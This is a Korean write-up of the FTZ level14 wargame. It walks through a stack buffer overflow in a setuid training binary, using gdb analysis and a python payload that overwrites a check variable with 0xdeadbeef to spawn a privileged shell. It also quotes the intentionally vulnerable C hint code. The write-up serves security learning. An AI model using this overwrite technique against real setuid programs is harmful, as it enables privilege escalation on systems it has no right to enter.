# FTZ Level14

#### ID : level14 PW: what that nigga want?
<br>

**먼저 ```ls -l```을 이용해 어떤 파일이 있는지 살펴보자**<br> 
attackme 프로그램에 level14의 권한으로 setuid가 걸려있는 것을 확인할 수 있다.<br><br>
우선 hint의 내용을 보자<br>
```cat hint```<br>
```c
#include <stdio.h>
#include <unistd.h>

main()
{
      int crap;
      int check;
      char buf[20];
      fgets(buf, 45, stdin);      #buf 변수에 45바이트만큼 입력받음
      if (check==0xdeadbeef)
      {
          setreuid(3095, 3095);
          system("/bin/sh");      #/bin/sh 쉘 실행
      }
}
```
```fgets``` 함수에서 BOF가 일어날 수 있다!!<br>
그런데 fgets는 45byte만큼만 받고 있으며 check가 0xdeadbeef일 때 쉘을 얻을 수 있다.<br>
45byte만 가지고 ret에 도달할 수 있을까?<br>

우리의 목적을 생각해보자.<br>
1. buf[20]에서 check까지, check에서 ret까지 거리 구하기
2. check에 0xdeadbeef 넣기
3. 페이로드 작성하고 공격!

**attackme 코드를 디버깅해야하기 때문에 tmp폴더로 복사하자.**<br>
```cp attackme tmp```<br><br>
**그리고 디버깅을 해보자**<br>
```gdb -q attackme```<br>
```disas main```<br>

<main+3>을 보면 0x38만큼의 공간을 만들고 있다. 0x38은 10진수로 56이다.<br>
crap 변수 4bytes, check 변수 4byte, buf 20byte 총 28byte가 필요한데 56byte를 할당했다는 것은 <br>
dummy로 28byte가 있다고 생각할 수 있다.<br>
dummy가 어디에 위치해 있는지 찾아봐야겠다.<br>
<main+29>를 보면 0xdeadbeef랑 0xfffffff0를 비교하고 있다.<br>
저 **0xfffffff0**이 바로 check의 주소인 것이다. 이는 ebp로부터 -16에 위치하고 있다.<br>
buf는 ebp로부터 -56에 위치하고있고 check는 -16에 위치하고 있으니<br>
buf에서 check까지의 거리는 **40**이다.<br>

현재 상태를 나타내보면 다음과 같다.<br>
**buf(20)+dummy(20)+check(4)+crap(4)+dummy(8)+sfp(4)+ret(4)**<br>

그렇다면 우리가 작성할 페이로드는 다음과 같다고 할 수 있다.<br>
**"A"*(buf~check까지 거리)+0xdeadbeef**<br>

**이제 페이로드를 작성해보자.**<br>
```(python -c 'print "A"*40+"\xef\xbe\xad\xde"';cat)|./attackme```<br>
*(주소는 little endian 방식으로 입력된다)*<br>
<br>
```cd ..``` 다시 원래 디렉토리로 되돌아가서<br>
**공격 실시!**<br>
```(python -c 'print "A"*40+"\xef\xbe\xad\xde"';cat)|./attackme```<br>
```my-pass```로 비밀번호를 물어보면<br>
Level15 Password is "~~". 라고 나올 것이다!!
